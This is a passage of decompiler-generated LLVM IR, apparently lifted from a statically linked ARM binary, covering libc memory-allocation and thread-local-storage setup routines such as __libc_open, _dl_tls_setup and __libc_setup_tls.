.thread6:                                         ; preds = %dec_label_pc_112dc, %dec_label_pc_112c4, %dec_label_pc_112a4, %dec_label_pc_11298, %bb32
  %v0_11300 = load i32, i32* @r5, align 4
  store i32 %v0_11300, i32* @r0, align 4
  %v0_11304 = call i32 @free()
  store i32 %v0_11304, i32* %r0.global-to-local, align 4
  %v0_11308 = load i32, i32* @r7, align 4
  %v1_11308 = add i32 %v0_11308, 8
  store i32 %v1_11308, i32* @r4, align 4
  br label %dec_label_pc_11444

dec_label_pc_11310:                               ; preds = %bb30, %.thread2, %dec_label_pc_11250
  %v0_11324 = phi i32 [ %v3_11280, %.thread2 ], [ %v1_11198, %bb30 ], [ %v1_11310.pre, %dec_label_pc_11250 ]
  %v0_11310 = load i32, i32* @sb, align 4
  %v2_11310 = sub i32 %v0_11324, %v0_11310
  store i32 %v2_11310, i32* %r1.global-to-local, align 4
  %v0_11318 = load i32, i32* @sl, align 4
  %v1_11318 = add i32 %v0_11318, 4
  %v2_11318 = inttoptr i32 %v1_11318 to i32*
  %v3_11318 = load i32, i32* %v2_11318, align 4
  %tmp41 = icmp ugt i32 %v2_11310, 15
  %v1_11340 = urem i32 %v3_11318, 2
  store i32 %v1_11340, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_11340, label %dec_label_pc_11320

dec_label_pc_11320:                               ; preds = %dec_label_pc_11310
  %v2_11324 = or i32 %v1_11340, %v0_11324
  store i32 %v2_11324, i32* %r3.global-to-local, align 4
  store i32 %v2_11324, i32* %v2_11318, align 4
  %v0_1132c = load i32, i32* @sl, align 4
  %v1_1132c = load i32, i32* %r0.global-to-local, align 4
  %v2_1132c = add i32 %v1_1132c, %v0_1132c
  store i32 %v2_1132c, i32* %r2.global-to-local, align 4
  %v1_11330 = add i32 %v2_1132c, 4
  %v2_11330 = inttoptr i32 %v1_11330 to i32*
  %v3_11330 = load i32, i32* %v2_11330, align 4
  %v1_11334 = or i32 %v3_11330, 1
  store i32 %v1_11334, i32* %r3.global-to-local, align 4
  store i32 %v1_11334, i32* %v2_11330, align 4
  br label %dec_label_pc_11370

dec_label_pc_11340:                               ; preds = %dec_label_pc_11310
  %v2_11344 = add i32 %v0_11318, %v0_11310
  store i32 %v2_11344, i32* %r0.global-to-local, align 4
  %v2_11348 = or i32 %v1_11340, %v0_11310
  store i32 %v2_11348, i32* %r3.global-to-local, align 4
  %v1_1134c = or i32 %v2_11310, 1
  store i32 %v1_1134c, i32* %r2.global-to-local, align 4
  store i32 %v2_11348, i32* %v2_11318, align 4
  %v0_11354 = load i32, i32* %r2.global-to-local, align 4
  %v1_11354 = load i32, i32* %r0.global-to-local, align 4
  %v2_11354 = add i32 %v1_11354, 4
  %v3_11354 = inttoptr i32 %v2_11354 to i32*
  store i32 %v0_11354, i32* %v3_11354, align 4
  %v0_11358 = load i32, i32* %r0.global-to-local, align 4
  %v1_11358 = load i32, i32* %r1.global-to-local, align 4
  %v2_11358 = add i32 %v1_11358, %v0_11358
  store i32 %v2_11358, i32* %r2.global-to-local, align 4
  %v1_1135c = add i32 %v2_11358, 4
  %v2_1135c = inttoptr i32 %v1_1135c to i32*
  %v3_1135c = load i32, i32* %v2_1135c, align 4
  %v1_11360 = or i32 %v3_1135c, 1
  store i32 %v1_11360, i32* %r3.global-to-local, align 4
  store i32 %v1_11360, i32* %v2_1135c, align 4
  %v0_11368 = load i32, i32* %r0.global-to-local, align 4
  %v1_11368 = add i32 %v0_11368, 8
  store i32 %v1_11368, i32* @r0, align 4
  %v0_1136c = call i32 @free()
  store i32 %v0_1136c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11340
  %v0_11370 = load i32, i32* @sl, align 4
  %v1_11370 = add i32 %v0_11370, 8
  store i32 %v1_11370, i32* @r4, align 4
  br label %dec_label_pc_11444

dec_label_pc_11378:                               ; preds = %bb29
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_11380 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_11380, i32* @r8, align 4
  %v2_11384 = inttoptr i32 %v1_11194 to i32*
  %v3_11384 = load i32, i32* %v2_11384, align 4
  store i32 %v3_11384, i32* @r4, align 4
  %v1_11388 = add i32 %v4_11380, 860
  %v2_11388 = inttoptr i32 %v1_11388 to i32*
  %v3_11388 = load i32, i32* %v2_11388, align 4
  %v1_1138c = add i32 %v3_11384, 4
  %v1_11390 = add i32 %v3_11388, -1
  store i32 %v1_11390, i32* %r2.global-to-local, align 4
  %v2_11394 = add i32 %v1_1138c, %v1_11390
  %v1_11398 = load i32, i32* @sb, align 4
  %v2_11398 = add i32 %v2_11394, %v1_11398
  store i32 %v2_11398, i32* %r3.global-to-local, align 4
  %v2_1139c = sub i32 0, %v3_11388
  %v3_1139c = and i32 %v2_11398, %v2_1139c
  store i32 %v3_1139c, i32* @r7, align 4
  %v2_113a0 = sub i32 %v3_1139c, %v3_11384
  store i32 %v2_113a0, i32* @fp, align 4
  %v9_113a4 = icmp eq i32 %v1_11198, %v2_113a0
  br i1 %v9_113a4, label %dec_label_pc_11418, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_11378
  %v2_113ac = sub i32 %v1_11194, %v3_11384
  store i32 %v2_113ac, i32* %r0.global-to-local, align 4
  %v2_113b0 = add i32 %v3_11384, %v1_11198
  store i32 %v2_113b0, i32* %r1.global-to-local, align 4
  store i32 %v3_1139c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_113bc = call i32 @mremap(i32 %v2_113ac, i32 %v2_113b0, i32 %v3_1139c, i32 1)
  store i32 %v4_113bc, i32* %r0.global-to-local, align 4
  %v7_113c0 = icmp eq i32 %v4_113bc, -1
  br i1 %v7_113c0, label %dec_label_pc_1140c, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113ac
  %v1_113c8 = load i32, i32* @r4, align 4
  %v2_113c8 = add i32 %v1_113c8, %v4_113bc
  store i32 %v2_113c8, i32* %r0.global-to-local, align 4
  %v0_113cc = load i32, i32* @fp, align 4
  %v1_113cc = or i32 %v0_113cc, 2
  store i32 %v1_113cc, i32* %r3.global-to-local, align 4
  %v2_113d0 = add i32 %v2_113c8, 4
  %v3_113d0 = inttoptr i32 %v2_113d0 to i32*
  store i32 %v1_113cc, i32* %v3_113d0, align 4
  %v0_113d4 = load i32, i32* @r8, align 4
  %v1_113d4 = add i32 %v0_113d4, 868
  %v2_113d4 = inttoptr i32 %v1_113d4 to i32*
  %v3_113d4 = load i32, i32* %v2_113d4, align 4
  store i32 %v3_113d4, i32* %r3.global-to-local, align 4
  %v1_113d8 = add i32 %v0_113d4, 880
  %v2_113d8 = inttoptr i32 %v1_113d8 to i32*
  %v3_113d8 = load i32, i32* %v2_113d8, align 4
  store i32 %v3_113d8, i32* %r2.global-to-local, align 4
  %v0_113dc = load i32, i32* @r6, align 4
  %v2_113dc = sub i32 %v3_113d4, %v0_113dc
  store i32 %v2_113dc, i32* %r3.global-to-local, align 4
  %v1_113e0 = load i32, i32* @r7, align 4
  %v2_113e0 = add i32 %v1_113e0, %v2_113dc
  store i32 %v2_113e0, i32* %r1.global-to-local, align 4
  %v1_113e4 = add i32 %v0_113d4, 872
  %v2_113e4 = inttoptr i32 %v1_113e4 to i32*
  %v3_113e4 = load i32, i32* %v2_113e4, align 4
  store i32 %v3_113e4, i32* %r3.global-to-local, align 4
  %v1_113ec = add i32 %v0_113d4, 884
  %v2_113ec = inttoptr i32 %v1_113ec to i32*
  %v3_113ec = load i32, i32* %v2_113ec, align 4
  store i32 %v3_113ec, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_113e0, %v3_113d8
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_113c8
  store i32 %v2_113e0, i32* %v2_113d8, align 4
  %v0_113f4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_113f4.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_113c8, %bb33
  %v1_113f4 = phi i32 [ %v0_113d4, %dec_label_pc_113c8 ], [ %v1_113f4.pre, %bb33 ]
  %v0_113f4 = phi i32 [ %v2_113e0, %dec_label_pc_113c8 ], [ %v0_113f4.pre, %bb33 ]
  %v2_113f4 = add i32 %v1_113f4, 868
  %v3_113f4 = inttoptr i32 %v2_113f4 to i32*
  store i32 %v0_113f4, i32* %v3_113f4, align 4
  %v0_113f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_113f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_113f8 = add i32 %v1_113f8, %v0_113f8
  store i32 %v2_113f8, i32* %r1.global-to-local, align 4
  %v1_113fc = load i32, i32* %r2.global-to-local, align 4
  %v0_11400 = load i32, i32* %r0.global-to-local, align 4
  %v1_11400 = add i32 %v0_11400, 8
  store i32 %v1_11400, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_113f8, %v1_113fc
  br i1 %tmp43, label %bb35, label %dec_label_pc_11444

bb35:                                             ; preds = %bb34
  %v5_11404 = load i32, i32* @r8, align 4
  %v6_11404 = add i32 %v5_11404, 884
  %v7_11404 = inttoptr i32 %v6_11404 to i32*
  store i32 %v2_113f8, i32* %v7_11404, align 4
  br label %dec_label_pc_11444

dec_label_pc_1140c:                               ; preds = %dec_label_pc_113ac
  %v0_1140c = load i32, i32* @sb, align 4
  %v1_1140c = add i32 %v0_1140c, 4
  store i32 %v1_1140c, i32* %r3.global-to-local, align 4
  %v0_11410 = load i32, i32* @r6, align 4
  %v3_11410 = icmp ult i32 %v0_11410, %v1_1140c
  br i1 %v3_11410, label %dec_label_pc_11420, label %dec_label_pc_1140c.dec_label_pc_11418_crit_edge

dec_label_pc_1140c.dec_label_pc_11418_crit_edge:  ; preds = %dec_label_pc_1140c
  %v0_11418.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11418

dec_label_pc_11418:                               ; preds = %dec_label_pc_1140c.dec_label_pc_11418_crit_edge, %dec_label_pc_11378
  %v0_11418 = phi i32 [ %v0_11418.pre, %dec_label_pc_1140c.dec_label_pc_11418_crit_edge ], [ %v0_11180, %dec_label_pc_11378 ]
  store i32 %v0_11418, i32* @r4, align 4
  br label %dec_label_pc_11444

dec_label_pc_11420:                               ; preds = %dec_label_pc_1140c
  %v1_11420 = add i32 %v0_1140c, -7
  store i32 %v1_11420, i32* %r0.global-to-local, align 4
  %v1_11424 = call i32 @malloc(i32 %v1_11420)
  store i32 %v1_11424, i32* @r0, align 4
  store i32 %v1_11424, i32* @r4, align 4
  %v2_11428 = icmp eq i32 %v1_11424, 0
  br i1 %v2_11428, label %dec_label_pc_11444, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11420
  %v0_11430 = load i32, i32* @r6, align 4
  %v1_11430 = add i32 %v0_11430, -8
  store i32 %v1_11430, i32* @r2, align 4
  %v0_11434 = load i32, i32* @r5, align 4
  store i32 %v0_11434, i32* @r1, align 4
  %v0_11438 = call i32 @memcpy()
  %v0_1143c = load i32, i32* @r5, align 4
  store i32 %v0_1143c, i32* @r0, align 4
  %v0_11440 = call i32 @free()
  store i32 %v0_11440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_11420, %dec_label_pc_11418, %dec_label_pc_11370, %.thread6, %dec_label_pc_111e0, %dec_label_pc_11430
  store i32 %v2_1112c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v4_11454 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 48) to i32*), align 4
  store i32 %v4_11454, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11454)
  br label %dec_label_pc_11460

dec_label_pc_11460:                               ; preds = %dec_label_pc_11160, %dec_label_pc_11108, %dec_label_pc_110f0, %dec_label_pc_11444
  %v0_11460 = load i32, i32* @r4, align 4
  store i32 %v0_11460, i32* %r0.global-to-local, align 4
  store i32 %v3_110d0, i32* @r4, align 4
  store i32 %v6_110d0, i32* @r5, align 4
  store i32 %v9_110d0, i32* @r6, align 4
  store i32 %v12_110d0, i32* @r7, align 4
  store i32 %v15_110d0, i32* @r8, align 4
  store i32 %v18_110d0, i32* @sb, align 4
  store i32 %v21_110d0, i32* @sl, align 4
  store i32 %v24_110d0, i32* @fp, align 4
  store i32 %v27_110d0, i32* @lr, align 4
  ret i32 %v0_11460

; uselistorder directives
  uselistorder i32 %v2_113f8, { 1, 0, 2 }
  uselistorder i32 %v2_113e0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_113bc, { 1, 0, 2 }
  uselistorder i32 %v3_1139c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11340, { 2, 1, 0 }
  uselistorder i32 %v2_11310, { 1, 0, 2 }
  uselistorder i32 %v0_112a4, { 1, 0 }
  uselistorder i32 %v1_11260, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_111c4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_111bc, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_111a0, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_11198, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_11194, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_11184, { 1, 0 }
  uselistorder i32 %v0_11180, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_11158, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 22, 13, 15, 14, 16, 23, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 16) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 72) to i32*), { 2, 0, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 116) to i32*), { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_11460, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11444, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_11370, { 1, 0 }
  uselistorder label %dec_label_pc_11310, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1125c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11250, { 1, 0 }
  uselistorder label %dec_label_pc_1124c, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_11474(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11474:
  %v0_11474 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11474, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_11474
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11474, %bb
  %v10_11490 = phi i32 [ %arg1, %dec_label_pc_11474 ], [ 0, %bb ]
  ret i32 %v10_11490

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_114a4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_114a4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_114a4 = load i32, i32* @r0, align 4
  ret i32 %v2_114a4

bb1:                                              ; preds = %entry
  %v0_114a8 = call i32 @__syscall_error()
  ret i32 %v0_114a8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_114b4 = load i32, i32* @global_var_255f0.254, align 4
  %v2_114b8 = icmp eq i32 %v3_114b4, 0
  br i1 %v2_114b8, label %dec_label_pc_114c0, label %entry.dec_label_pc_114dc_crit_edge

entry.dec_label_pc_114dc_crit_edge:               ; preds = %entry
  %v3_114dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_114dc

dec_label_pc_114c0:                               ; preds = %entry
  %v0_114c0 = load i32, i32* @r7, align 4
  store i32 %v0_114c0, i32* @ip, align 4
  %v0_114d0 = load i32, i32* @r0, align 4
  %v2_114d0 = icmp ugt i32 %v0_114d0, -4097
  br i1 %v2_114d0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_114dc, %dec_label_pc_114c0
  %merge = phi i32 [ %v0_114d0, %dec_label_pc_114c0 ], [ %v0_11500, %dec_label_pc_114dc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_114c0
  %v0_114d8 = call i32 @__syscall_error()
  br label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %entry.dec_label_pc_114dc_crit_edge, %bb8
  %v3_114dc = phi i32 [ %v3_114dc.pre, %entry.dec_label_pc_114dc_crit_edge ], [ %v0_114d8, %bb8 ]
  store i32 %v3_114dc, i32* %stack_var_-24, align 4
  %v9_114dc = load i32, i32* @r2, align 4
  %v12_114dc = load i32, i32* @r3, align 4
  %v15_114dc = load i32, i32* @r7, align 4
  store i32 %v15_114dc, i32* %stack_var_-8, align 4
  %v18_114dc = load i32, i32* @lr, align 4
  %v0_114e0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_114e0, i32* @ip, align 4
  %v2_114e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_114dc, i32* @r2, align 4
  store i32 %v12_114dc, i32* @r3, align 4
  store i32 %v2_114e8, i32* @r7, align 4
  %v1_114fc = call i32 @__libc_disable_asynccancel(i32 %v0_114e0)
  %v0_11500 = load i32, i32* @r7, align 4
  store i32 %v0_11500, i32* @r0, align 4
  %v2_11504 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11504, i32* @r7, align 4
  store i32 %v18_114dc, i32* @lr, align 4
  %v2_11508 = icmp ugt i32 %v0_11500, -4097
  br i1 %v2_11508, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_114dc
  %v0_11510 = call i32 @__syscall_error()
  ret i32 %v0_11510

; uselistorder directives
  uselistorder i32 %v0_11500, { 1, 2, 0 }
  uselistorder label %dec_label_pc_114dc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v3_1152c = load i32, i32* @r4, align 4
  store i32 %v3_1152c, i32* %stack_var_-16, align 4
  %v4_11530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 80) to i32*), align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11538 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 64) to i32*), align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_11540 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 40) to i32*), align 4
  store i32 %v4_11540, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v1_11548 = inttoptr i32 %v4_11530 to i32*
  %v2_11548 = load i32, i32* %v1_11548, align 4
  %v4_1154c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 56) to i32*), align 4
  store i32 %v4_1154c, i32* %lr.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v1_11554 = add i32 %v2_11548, 15
  %v4_11558 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 152) to i32*), align 4
  store i32 %v4_11558, i32* @ip, align 4
  %v1_1155c = load i32, i32* @r0, align 4
  %v2_1155c = add i32 %v1_1155c, %v1_11554
  %v1_11560 = inttoptr i32 %v4_11538 to i32*
  %v2_11560 = load i32, i32* %v1_11560, align 4
  store i32 %v2_11560, i32* %r3.global-to-local, align 4
  %v1_11564 = and i32 %v2_1155c, -16
  store i32 %v1_11564, i32* %v1_11548, align 4
  %v0_1156c = load i32, i32* @r0, align 4
  %v1_1156c = load i32, i32* %r4.global-to-local, align 4
  %v2_1156c = inttoptr i32 %v1_1156c to i32*
  store i32 %v0_1156c, i32* %v2_1156c, align 4
  %v0_11570 = load i32, i32* @r1, align 4
  %v1_11570 = load i32, i32* %lr.global-to-local, align 4
  %v2_11570 = inttoptr i32 %v1_11570 to i32*
  store i32 %v0_11570, i32* %v2_11570, align 4
  %v0_11574 = load i32, i32* %r3.global-to-local, align 4
  %v1_11574 = load i32, i32* @ip, align 4
  %v2_11574 = inttoptr i32 %v1_11574 to i32*
  store i32 %v0_11574, i32* %v2_11574, align 4
  %v2_11578 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11578, i32* %r4.global-to-local, align 4
  %v1_1157c = load i32, i32* @r0, align 4
  ret i32 %v1_1157c
}

define i32 @function_11584(i32 %arg1) local_unnamed_addr {
dec_label_pc_11584:
  %v0_11584 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11584, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11584
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11584, %bb
  %v4_11594 = phi i32 [ %arg1, %dec_label_pc_11584 ], [ 0, %bb ]
  ret i32 %v4_11594

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r3.global-to-local, align 4
  %v4_115a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 92) to i32*), align 4
  store i32 %v4_115a8, i32* @lr, align 4
  %v4_115b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 64) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 11364) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 11364), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_115d4 = inttoptr i32 %v4_115b4 to i32*
  store i32 1, i32* %v2_115d4, align 4
  %v0_115d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_115d8 = load i32, i32* @lr, align 4
  %v2_115d8 = inttoptr i32 %v1_115d8 to i32*
  store i32 %v0_115d8, i32* %v2_115d8, align 4
  %v0_115dc = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_115f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_115f4:
  %v0_115f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_115f4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_115f4, %bb
  %v9_115fc = phi i32 [ %arg1, %dec_label_pc_115f4 ], [ 0, %bb ]
  ret i32 %v9_115fc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_11608 = call i32 @__aeabi_read_tp()
  %v1_1160c = inttoptr i32 %v0_11608 to i32*
  %v2_1160c = load i32, i32* %v1_1160c, align 4
  %v1_11610 = add i32 %arg1, 4
  %v2_11610 = inttoptr i32 %v1_11610 to i32*
  %v3_11610 = load i32, i32* %v2_11610, align 4
  %v1_11614 = add i32 %v2_1160c, 8
  %v2_11614 = inttoptr i32 %v1_11614 to i32*
  %v3_11614 = load i32, i32* %v2_11614, align 4
  %v2_11618 = add i32 %v3_11614, %v3_11610
  ret i32 %v2_11618
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11624 = load i32, i32* @r4, align 4
  store i32 %v3_11624, i32* %stack_var_-36, align 4
  %v6_11624 = load i32, i32* @r5, align 4
  %v15_11624 = load i32, i32* @r8, align 4
  %v18_11624 = load i32, i32* @sb, align 4
  %v21_11624 = load i32, i32* @sl, align 4
  %v24_11624 = load i32, i32* @fp, align 4
  %v27_11624 = load i32, i32* @lr, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %sl.global-to-local, align 4
  %v4_11634 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 112) to i32*), align 4
  store i32 %v4_11634, i32* %r3.global-to-local, align 4
  %v1_11638 = inttoptr i32 %v4_11634 to i32*
  %v2_11638 = load i32, i32* %v1_11638, align 4
  store i32 %v2_11638, i32* %r2.global-to-local, align 4
  %v2_1163c = icmp eq i32 %v2_11638, 0
  %v0_11644 = load i32, i32* %r0.global-to-local, align 4
  %v0_11648 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11648, i32* %ip.global-to-local, align 4
  br i1 %v2_1163c, label %dec_label_pc_11810, label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %entry
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_11654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 164) to i32*), align 4
  store i32 %v4_11654, i32* @lr, align 4
  store i32 %v2_11638, i32* %r1.global-to-local, align 4
  %v1_1169c = inttoptr i32 %v4_11654 to i32*
  %v2_1169c61 = load i32, i32* %v1_1169c, align 4
  %v4_116a062 = mul i32 %v2_1169c61, 32
  %v5_116a063 = add i32 %v4_116a062, %v2_11638
  store i32 %v5_116a063, i32* %r3.global-to-local, align 4
  %v3_116a465 = icmp ult i32 %v2_11638, %v5_116a063
  br i1 %v3_116a465, label %dec_label_pc_11660, label %dec_label_pc_11810.loopexit

dec_label_pc_11660:                               ; preds = %dec_label_pc_11650, %dec_label_pc_11698
  %v0_1167866 = phi i32 [ %v1_11698, %dec_label_pc_11698 ], [ %v2_11638, %dec_label_pc_11650 ]
  %v1_11660 = inttoptr i32 %v0_1167866 to i32*
  %v2_11660 = load i32, i32* %v1_11660, align 4
  store i32 %v2_11660, i32* %r3.global-to-local, align 4
  %v7_11664 = icmp eq i32 %v2_11660, 7
  br i1 %v7_11664, label %dec_label_pc_1166c, label %dec_label_pc_11698

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11660
  %v1_1166c = add i32 %v0_1167866, 20
  %v2_1166c = inttoptr i32 %v1_1166c to i32*
  %v3_1166c = load i32, i32* %v2_1166c, align 4
  store i32 %v3_1166c, i32* %r3.global-to-local, align 4
  %v1_11670 = add i32 %v0_1167866, 28
  %v2_11670 = inttoptr i32 %v1_11670 to i32*
  %v3_11670 = load i32, i32* %v2_11670, align 4
  store i32 %v3_11670, i32* @r6, align 4
  %v1_11678 = add i32 %v0_1167866, 16
  %v2_11678 = inttoptr i32 %v1_11678 to i32*
  %v3_11678 = load i32, i32* %v2_11678, align 4
  store i32 %v3_11678, i32* %r3.global-to-local, align 4
  %v1_1167c = add i32 %v0_1167866, 8
  %v2_1167c = inttoptr i32 %v1_1167c to i32*
  %v3_1167c = load i32, i32* %v2_1167c, align 4
  store i32 %v3_1167c, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_11670, %v0_11648
  %v0_11648.v3_11670 = select i1 %tmp78, i32 %v0_11648, i32 %v3_11670
  store i32 %v0_11648.v3_11670, i32* %fp.global-to-local, align 4
